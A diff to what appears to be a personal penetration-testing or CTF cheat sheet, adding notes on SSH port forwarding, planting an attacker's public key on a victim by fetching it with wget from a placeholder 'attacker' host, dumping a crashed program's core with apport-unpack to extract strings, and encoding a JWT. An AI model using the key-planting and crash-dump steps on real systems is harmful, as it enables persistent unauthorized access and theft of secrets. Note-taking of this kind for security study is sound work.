@@ -89,7 +89,42 @@ check for `/etc/default/tftpd-hpa`
 
 ## SSH port forwarding
 
-copy your pub key to the victim under `/home/user/.ssh/authorized_keys`
+append your pub key to `/home/user/.ssh/authorized_keys`
 
 `ssh -i key -L 8000:127.0.0.1:8000 <user>@<ip>`
+
+
+## Adding your SSH to the victim
+```
+Append your public to the victim's ~/.ssh/authorized_keys
+---
+On attacker:
+ssh-keygen
+
+On victim:
+wget http://attacker/id_rsa.pub
+cat id_rsa.pub >> ~/.ssh/authorized_keys
+```
+
+## Getting Crash Data
+
+```
+While program is running, kill it with
+---
+kill -BUS <pid>
+
+Get the data from the crash log
+---
+apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashed
+strings /tmp/crashed/CoreDump
+```
+
+## JWT generation
+
+```
+pip install pyjwt
+
+>>> import jwt
+>>> encoded_jwt = jwt.encode({"some": "payload"}, "secret", algorithm="HS256")
+```
 
